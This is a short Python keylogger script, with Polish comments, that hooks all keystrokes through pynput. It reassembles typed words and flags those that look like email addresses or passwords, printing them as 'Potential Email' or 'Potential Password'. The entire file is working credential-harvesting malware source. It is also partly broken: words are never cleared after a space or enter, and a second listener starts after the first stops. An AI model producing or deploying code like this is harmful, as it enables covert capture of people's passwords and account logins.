from pynput import keyboard
import re

class MyException(Exception):
    pass

current_word = ""
caps_lock_active = False  # Flaga do śledzenia stanu Caps Lock


def is_potential_password(word):
    # Sprawdza, czy słowo spełnia kryteria hasła
    return len(word) >= 8 and (
            any(char.isdigit() for char in word) or
            any(char.isupper() for char in word) or
            any(not char.isalnum() for char in word)
    )


def is_email(word):
    # Prosta walidacja adresu e-mail
    return re.match(r"^[^@]+@[^@]+\.[^@]+$", word) is not None


def on_press(key):
    global current_word, caps_lock_active

    try:
        if key == keyboard.Key.caps_lock:
            caps_lock_active = not caps_lock_active
            return


        if key == keyboard.Key.backspace:
            current_word = current_word[:-1]
            # print(f"Current word: {current_word}")

        # Sprawdzamy, czy wciśnięto znak kończący zdanie
        elif key in {keyboard.Key.enter, keyboard.Key.space, keyboard.Key.tab}:
            if current_word:  # Jeśli słowo nie jest puste
                # Sprawdzamy, czy to e-mail
                if is_email(current_word):
                    print(f"Potential Email: {current_word}")
                elif is_potential_password(current_word):
                    print(f"Potential Password: {current_word}")
                else:
                    print(f"Normal word: {current_word}")

        elif hasattr(key, 'char') and key.char is not None:  # Tylko dodajemy, jeśli klawisz jest znakiem
            if key.char in {'!', '?', '.'}:
                # Jeśli wciśnięto znak kończący zdanie
                current_word += key.char
                if is_email(current_word):
                    print(f"Potential Email: {current_word}")
                elif is_potential_password(current_word):
                    print(f"Potential Password: {current_word}")
                else:
                    print(f"Normal word: {current_word}")

                # Umożliwiamy zakończenie e-maili z kropką
                if current_word[-1] in {'!', '?'}:
                    current_word = ""

            else:
                if caps_lock_active:
                    current_word += key.char.upper()
                else:
                    current_word += key.char.lower()
                # print(f"Current word: {current_word}")

    except Exception as e:
        print(f"Error: {e}")  # Obsługuje wszelkie inne błędy


def on_release(key):
     # print(' {0} released'.format(key))
     if key == keyboard.Key.page_down:
         return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    try:
        listener.join() #Czekaj na koniec działania listenera
    except MyException as e:
        print(f"Error during listening: {e}")



listener = keyboard.Listener(on_press = on_press, on_release = on_release)
listener.start()